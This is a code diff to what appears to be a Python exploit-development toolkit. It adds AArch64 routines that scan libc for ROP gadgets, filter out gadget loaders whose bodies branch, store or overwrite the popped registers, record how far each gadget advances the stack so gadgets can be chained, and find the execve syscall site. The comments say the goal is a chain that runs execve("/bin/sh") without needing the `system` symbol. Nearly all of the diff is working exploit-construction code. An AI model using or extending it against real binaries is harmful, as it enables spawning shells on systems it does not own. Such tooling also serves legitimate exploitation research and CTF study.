@@ -791,6 +791,48 @@ def find_br_gadgets_aarch64(data: bytes):
     return out
 
 
+def _a64_is_branch(w: int) -> bool:
+    """True if `w` is any AArch64 branch -- b/bl (imm), b.cond, cbz/cbnz, tbz/tbnz, br/blr/ret. A
+    loader whose body BRANCHES between its arg-pop and its `ldp x29,x30` epilogue is not a reliable
+    ROP gadget: the branch can skip the epilogue (e.g. `cmp x1,x0; b.ne` -- measured on a real
+    `ldp x0,x1` loader whose b.ne fired whenever x0!=x1 and threw the chain off the epilogue), so it
+    only chains for specific register values. The clean-body loaders are the chainable ones."""
+    return ((w & 0xFC000000) == 0x14000000                       # b
+            or (w & 0xFC000000) == 0x94000000                    # bl
+            or (w & 0xFF000000) == 0x54000000                    # b.cond
+            or (w & 0x7E000000) == 0x34000000                    # cbz/cbnz
+            or (w & 0x7E000000) == 0x36000000                    # tbz/tbnz
+            or (w & 0xFFFFFC1F) == 0xD61F0000                    # br
+            or (w & 0xFFFFFC1F) == 0xD63F0000)                   # blr
+
+
+def _a64_body_hazard(w: int, loaded: tuple) -> bool:
+    """True if body instruction `w` would wreck a loader chain that popped the registers in
+    `loaded`: a BRANCH (may skip the epilogue), a STORE (writes memory at a register that is
+    attacker-uncontrolled or is the just-loaded &"/bin/sh" -- `stp xzr,xzr,[x0]` on a read-only
+    string SIGSEGVs, measured on a real `ldp x0,x2` loader), or any write to a loaded register
+    (`mov w0,#0` after `ldp x0,x2` zeroes the argument -- also measured). Catching these is why the
+    `ldp x0,*` gadgets this libc has are NOT usable for a 3-register execve chain even though they
+    decode as loaders: the one-arg ret2libc never hit it because its loader bodies are simple
+    restores, but a store/clobber body is common and must be rejected."""
+    if _a64_is_branch(w):
+        return True
+    # STORE families (bit 22 == 0 is a store for the load/store opcodes): STR/STUR imm, STP.
+    if (w & 0x3B000000) == 0x39000000 and not (w & 0x00400000):   # STR/STUR (unsigned/unscaled) imm
+        return True
+    if (w & 0x7FC00000) in (0x29000000, 0x28000000, 0x29800000):  # STP (no writeback / pre / post)
+        return True
+    # A data-processing / move whose DESTINATION is one of the loaded regs clobbers the argument.
+    # Loads (bit 27..) are excluded -- the loader's own ldp is handled by the caller; here we only
+    # see body instructions, and a move/ALU op to x0/x1/x2 (Rd = bits 4:0) undoes the pop.
+    if (w & 0x1F) in loaded and ((w & 0x7F000000) == 0x52000000      # movz/movn/movk (wide imm)
+                                 or (w & 0x7F000000) == 0x2A000000    # orr/mov (reg)
+                                 or (w & 0x7F000000) == 0x0B000000    # add (reg)
+                                 or (w & 0x7F000000) == 0x11000000):  # add (imm)
+        return True
+    return False
+
+
 _A64_RET = 0xD65F03C0                                    # ret (x30)
 _A64_NOPS = {0xD503201F, 0xD50323BF, 0xD50323FF,         # nop, autiasp, autibsp
              0xD503235F, 0xD503239F}                     # autiaz, autibz (auth = nop under qemu)
@@ -865,6 +907,7 @@ def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
         a_off = _a64_ldp_imm(w)
         if a_off < 0:                                    # words must land in the forward overflow
             continue
+        body_clean = True                                # no branch between the arg-pop and epilogue
         for k in range(i + 1, min(i + 8, len(words))):
             wk = words[k][1]
             if wk in _A64_NOPS:
@@ -877,12 +920,42 @@ def find_aarch64_r2libc_gadgets(data: bytes) -> dict:
                     if wj in _A64_NOPS:
                         continue
                     if wj == _A64_RET:
-                        loaders.append({"va": va, "r1": r1, "r2": r2, "a_off": a_off})
+                        # m_off = the post-indexed `ldp x29,x30,[sp],#M` displacement: how far sp
+                        # advances past this loader, hence where a CHAINED next gadget's frame
+                        # begins (its entry sp = this loader's entry sp + M). ret2libc ignores it
+                        # (one loader, then a caller that pops nothing); the execve-syscall chain
+                        # needs it to stack a second loader. `clean` = the body between the arg-pop
+                        # and the epilogue does not BRANCH, so the epilogue is always reached (a
+                        # branching body, e.g. `cmp x1,x0; b.ne`, only chains for specific values).
+                        loaders.append({"va": va, "r1": r1, "r2": r2, "a_off": a_off,
+                                        "m_off": _a64_ldp_imm(wk), "clean": body_clean})
                     break
                 break
             if lr and (lr[0] in (r1, r2) or lr[1] in (r1, r2)):
                 break                                    # r1/r2 clobbered before the restore
+            if _a64_body_hazard(wk, (r1, r2)):
+                body_clean = False                       # branch / store / clobber in the body
     return {"callers": callers, "loaders": loaders}
+
+
+def find_aarch64_execve_site(data: bytes):
+    """The address of a `mov x8, #221 ; svc #0` sequence -- libc's execve syscall site. Reaching it
+    with x0=&"/bin/sh", x1=0, x2=0 is execve("/bin/sh", NULL, NULL): a cross-arch L3 that needs no
+    `system` symbol in the image, unlike ret2libc. 221 is the aarch64 execve syscall number; jumping
+    to the `movz` sets x8 and the following `svc` makes the call with x0/x1/x2 as set by the chain.
+    Returns the va of the `movz x8,#221`, or None. Pure byte decode (no aarch64 objdump on the host).
+
+    Any `svc #0` preceded by a `movz x8,#221` qualifies; the common site is libc's own execve
+    thunk. (A bare `svc` reached with x8 already 221 would also work, but then x8 has to be set by a
+    gadget, which the arg-register scarcity makes unreliable -- the movz+svc pair sets it for us.)"""
+    MOVZ_X8_221 = 0xD2800008 | (221 << 5)
+    SVC0 = 0xD4000001
+    prev = None                                          # (va, word) of the preceding instruction
+    for va, w in _a64_words(data):
+        if w == SVC0 and prev is not None and prev[0] == va - 4 and prev[1] == MOVZ_X8_221:
+            return prev[0]                               # jump to the movz, not the svc
+        prev = (va, w)
+    return None
 
 
 def find_arm_r0pc_gadgets(data: bytes):
